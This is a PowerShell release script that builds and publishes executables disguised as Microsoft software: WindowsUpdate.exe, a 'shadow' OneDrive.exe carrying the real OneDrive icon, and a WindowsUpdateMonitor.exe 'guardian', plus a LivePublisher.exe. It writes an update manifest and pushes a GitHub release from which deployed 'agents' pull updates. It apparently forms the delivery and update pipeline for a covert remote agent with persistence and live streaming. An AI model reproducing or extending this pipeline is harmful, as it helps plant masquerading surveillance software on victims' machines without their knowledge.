# release.ps1 - build WindowsUpdate.exe + OneDrive.exe (shadow) + update manifest.json
# + git commit/push + GitHub Release. Auto-installs git, gh CLI, dotnet SDK, and
# ImageMagick via winget if missing. Fetches a OneDrive-cloud PNG from the
# configured URL and converts it into a multi-resolution .ico the OneDrive build
# embeds as its application icon.
#
# ASCII-only script body: PowerShell 5.1 reads .ps1 files without a BOM as the
# system ANSI codepage. Any non-ASCII character becomes mojibake and the parser
# then rejects follow-on tokens. Keep comments and strings pure ASCII.
#
# Usage:
#   .\release.ps1 -Version 1.0.23
#   .\release.ps1 -Version 1.0.23 -Notes "First dual-exe release"
#   .\release.ps1 -Version 1.0.23 -SkipBuild
#   .\release.ps1 -Version 1.0.23 -SkipUpload

param(
    [Parameter(Mandatory=$true)] [string] $Version,
    [string] $Notes = "",
    [switch] $SkipBuild,
    [switch] $SkipUpload
)

$ErrorActionPreference = "Stop"

# ---------------- Paths ----------------
$agentSource         = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
$primaryExe          = Join-Path $agentSource "publish_out\WindowsUpdate.exe"
$shadowExe           = Join-Path $agentSource "publish_out_shadow\OneDrive.exe"
$guardianExe         = Join-Path $agentSource "publish_out_guardian\WindowsUpdateMonitor.exe"
$livePublisherExe    = "C:\Users\mohba\OneDrive\Desktop\pranks\livestream\LivePublisher.exe"
$manifestDir         = $PSScriptRoot
$manifestPath        = Join-Path $manifestDir "manifest.json"
$iconDest            = Join-Path $agentSource "Assets\OneDrive.ico"

# ---------------- Icon source config ----------------
# Primary source: extract the icon directly from the local Microsoft OneDrive
# install (every Windows 10/11 system Microsoft ships ships with it) via
# System.Drawing.Icon.ExtractAssociatedIcon. This avoids depending on an
# external CDN and gets the official OneDrive icon rather than a Wikipedia logo.
$iconLocalSource     = Join-Path $env:LOCALAPPDATA "Microsoft\OneDrive\OneDrive.exe"

# ---------------- GitHub repo ----------------
$ghOwner = "sayamuhbani59-collab"
$ghRepo  = "homectrl-updates"

function Fail($msg) { Write-Host "[FAIL] $msg" -ForegroundColor Red; exit 1 }

function Refresh-Path {
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("Path", "User")
}

function Ensure-Tool {
    param(
        [Parameter(Mandatory=$true)] [string] $Command,
        [Parameter(Mandatory=$true)] [string] $WingetId,
        [string] $DisplayName = $Command
    )
    $exists = Get-Command $Command -ErrorAction SilentlyContinue
    if ($exists) { return }

    Write-Host "[INST] $DisplayName not found - installing via winget ($WingetId)..." -ForegroundColor Yellow

    $winget = Get-Command winget -ErrorAction SilentlyContinue
    if (-not $winget) {
        Fail "winget not available. Install $DisplayName manually or update Windows (App Installer)."
    }

    winget install --id $WingetId --exact --silent --accept-source-agreements --accept-package-agreements | Out-Host
    # Exit code -1978335189 = APPINSTALLER_CLI_ERROR_UPDATE_NOT_APPLICABLE: the
    # package is already installed and up-to-date. That is fine for us - just
    # refresh PATH and recheck.
    if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne -1978335189) {
        Fail "winget install $WingetId failed (exit $LASTEXITCODE)"
    }

    Refresh-Path

    $recheck = Get-Command $Command -ErrorAction SilentlyContinue
    if (-not $recheck) {
        Fail "$DisplayName installed but '$Command' still not on PATH. Restart terminal and retry."
    }
    Write-Host "[OK]   $DisplayName installed" -ForegroundColor Green
}

function Compute-Sha256 {
    param([Parameter(Mandatory=$true)] [string] $Path)
    return (Get-FileHash -Algorithm SHA256 -LiteralPath $Path).Hash.ToLower()
}

# ---------------- Prerequisites (auto-install) ----------------
Write-Host "[CHECK] Prerequisites..." -ForegroundColor Cyan
# Pull latest PATH from registry so tools installed by winget in a previous
# session are visible to this one without a terminal restart.
Refresh-Path
Ensure-Tool -Command "git"     -WingetId "Git.Git"                 -DisplayName "Git"
Ensure-Tool -Command "dotnet"  -WingetId "Microsoft.DotNet.SDK.8"  -DisplayName ".NET 8 SDK"
Ensure-Tool -Command "gh"      -WingetId "GitHub.cli"              -DisplayName "GitHub CLI"
# ImageMagick not needed anymore - icon is extracted directly from OneDrive.exe.

# Don't use 2>&1 on native commands: PS 5.1 wraps every stderr line as a
# NativeCommandError which, combined with $ErrorActionPreference=Stop, halts the
# script even on exit code 0. `2>$null` alone is not enough on PS 5.1 either:
# the wrapping still happens before the redirect takes effect, so we lower
# ErrorActionPreference around the native call and restore it afterwards.
$prevEap = $ErrorActionPreference
$ErrorActionPreference = 'SilentlyContinue'
gh auth status 2>$null | Out-Null
$authExit = $LASTEXITCODE
$ErrorActionPreference = $prevEap
if ($authExit -ne 0) {
    Write-Host "[AUTH] gh CLI not logged in - starting 'gh auth login'..." -ForegroundColor Yellow
    Write-Host "       Pick: GitHub.com -> HTTPS -> Yes (authenticate git) -> Login with browser" -ForegroundColor Yellow
    gh auth login
    if ($LASTEXITCODE -ne 0) { Fail "gh auth login aborted - cannot create release." }
}

# ---------------- 1) Icon extraction from local OneDrive.exe (idempotent) --------
if (-not (Test-Path $iconDest)) {
    $assetsDir = Split-Path -Parent $iconDest
    if (-not (Test-Path $assetsDir)) { New-Item -ItemType Directory -Force $assetsDir | Out-Null }
    if (-not (Test-Path $iconLocalSource)) {
        Write-Host "[ICON] Local OneDrive not found at $iconLocalSource - OneDrive.csproj will build with default .NET icon (ApplicationIcon tag is conditional)." -ForegroundColor Yellow
    } else {
        Write-Host "[ICON] Extracting icon from local OneDrive.exe..." -ForegroundColor Cyan
        try {
            Add-Type -AssemblyName System.Drawing -ErrorAction Stop
            $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconLocalSource)
            if ($null -eq $icon) { Fail "ExtractAssociatedIcon returned null" }
            try {
                $fs = [System.IO.File]::Create($iconDest)
                try { $icon.Save($fs) } finally { $fs.Close() }
            } finally { $icon.Dispose() }
            Write-Host "       -> $iconDest" -ForegroundColor Green
        } catch {
            Fail "Icon extraction failed: $($_.Exception.Message)"
        }
    }
} else {
    Write-Host "[ICON] Icon present ($iconDest) - skip extract." -ForegroundColor DarkGray
}

# ---------------- 2) Build primary (WindowsUpdate.exe) ----------------
if (-not $SkipBuild) {
    Write-Host "[BUILD] WindowsUpdate.exe (primary, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
    Push-Location $agentSource
    try {
        dotnet publish Agent.csproj -c Release -o .\publish_out -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish Agent.csproj failed" }
    }
    finally { Pop-Location }

    Write-Host "[BUILD] OneDrive.exe (shadow, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
    Push-Location $agentSource
    try {
        dotnet publish OneDrive.csproj -c Release -o .\publish_out_shadow -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish OneDrive.csproj failed" }
    }
    finally { Pop-Location }

    Write-Host "[BUILD] WindowsUpdateMonitor.exe (health monitor, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
    Push-Location $agentSource
    try {
        dotnet publish Guardian\Guardian.csproj -c Release -o .\publish_out_guardian -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish Guardian.csproj failed" }
    }
    finally { Pop-Location }
}

if (-not (Test-Path $primaryExe)) { Fail "primary exe not found: $primaryExe" }
if (-not (Test-Path $shadowExe))  { Fail "shadow exe not found: $shadowExe" }
$haveGuardian = Test-Path $guardianExe
if (-not $haveGuardian) {
    Write-Host "[WARN] WindowsUpdateMonitor.exe nicht gefunden ($guardianExe) - manifest wird ohne guardian-Felder gebaut." -ForegroundColor Yellow
}
$havePublisher = Test-Path $livePublisherExe
if (-not $havePublisher) {
    Write-Host "[WARN] LivePublisher.exe nicht gefunden ($livePublisherExe) - manifest wird ohne livePublisher-Felder gebaut." -ForegroundColor Yellow
}

# ---------------- 3) SHA-256 + size (both exes) ----------------
Write-Host "[HASH]  Computing SHA-256..." -ForegroundColor Cyan
$primaryHash = Compute-Sha256 -Path $primaryExe
$primarySize = (Get-Item $primaryExe).Length
$shadowHash  = Compute-Sha256 -Path $shadowExe
$shadowSize  = (Get-Item $shadowExe).Length
$primaryMb = [math]::Round($primarySize/1MB, 1)
$shadowMb  = [math]::Round($shadowSize/1MB, 1)
Write-Host ("        primary sha256 = {0}  ({1} MB)" -f $primaryHash, $primaryMb)
Write-Host ("        shadow  sha256 = {0}  ({1} MB)" -f $shadowHash,  $shadowMb)
$guardianHash = $null
$guardianSize = 0
if ($haveGuardian) {
    $guardianHash = Compute-Sha256 -Path $guardianExe
    $guardianSize = (Get-Item $guardianExe).Length
    $gMb = [math]::Round($guardianSize/1MB, 1)
    Write-Host ("        guardian sha256 = {0}  ({1} MB)" -f $guardianHash, $gMb)
}
$livePublisherHash = $null
$livePublisherSize = 0
if ($havePublisher) {
    $livePublisherHash = Compute-Sha256 -Path $livePublisherExe
    $livePublisherSize = (Get-Item $livePublisherExe).Length
    $lpMb = [math]::Round($livePublisherSize/1MB, 1)
    Write-Host ("        livePub sha256 = {0}  ({1} MB)" -f $livePublisherHash, $lpMb)
}

# ---------------- 4) Update manifest.json ----------------
Write-Host "[MANI] Updating manifest.json..." -ForegroundColor Cyan
$primaryUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdate.exe"
$shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/OneDrive.exe"
$guardianUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdateMonitor.exe"
$livePublisherUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/LivePublisher.exe"
$manifestObj = [ordered]@{
    version      = $Version
    sha256       = $primaryHash
    url          = $primaryUrl
    shadowSha256 = $shadowHash
    shadowUrl    = $shadowUrl
}
if ($haveGuardian) {
    $manifestObj.guardianSha256 = $guardianHash
    $manifestObj.guardianUrl    = $guardianUrl
}
if ($havePublisher) {
    $manifestObj.livePublisherSha256 = $livePublisherHash
    $manifestObj.livePublisherUrl    = $livePublisherUrl
}
$manifestObj.notes = $Notes
$manifest = $manifestObj | ConvertTo-Json -Depth 4
Set-Content -Path $manifestPath -Value $manifest -Encoding utf8
Write-Host "       -> $manifestPath"

# ---------------- 5) Git commit + push ----------------
Write-Host "[GIT]  add + commit + push manifest..." -ForegroundColor Cyan
Push-Location $manifestDir
try {
    git add manifest.json README.md .gitignore release.ps1 install.ps1 guardian.ps1 2>$null | Out-Null
    $status = git status --porcelain
    if ($status) {
        git commit -m "release v$Version (dual exe: WindowsUpdate + OneDrive shadow)" | Out-Null
        git push
        if ($LASTEXITCODE -ne 0) { Fail "git push failed - check remote/credentials" }
        Write-Host "       -> pushed to $ghOwner/$ghRepo main" -ForegroundColor Green
    } else {
        Write-Host "       (no changes to commit)" -ForegroundColor Yellow
    }
}
finally { Pop-Location }

# ---------------- 6) GitHub Release + Exe Upload (both assets) ----------------
if ($SkipUpload) {
    Write-Host "[SKIP] SkipUpload set - create release manually:" -ForegroundColor Yellow
    Write-Host "       https://github.com/$ghOwner/$ghRepo/releases/new  ->  Tag v$Version"
    Write-Host "       Assets: $primaryExe  +  $shadowExe"
    exit 0
}

Write-Host "[REL]  GitHub Release v$Version + asset uploads via gh CLI..." -ForegroundColor Cyan
$notesArg = if ([string]::IsNullOrWhiteSpace($Notes)) { "Release v$Version" } else { $Notes }
$assets = @($primaryExe, $shadowExe)
if ($haveGuardian)  { $assets += $guardianExe }
if ($havePublisher) { $assets += $livePublisherExe }
gh release create "v$Version" @assets --title "v$Version" --notes $notesArg
if ($LASTEXITCODE -ne 0) { Fail "gh release create failed" }
Write-Host "[OK]   Release v$Version live" -ForegroundColor Green
Write-Host "       Agents pull within autoUpdateIntervalMinutes. Trigger now: /checkupdate force" -ForegroundColor Green
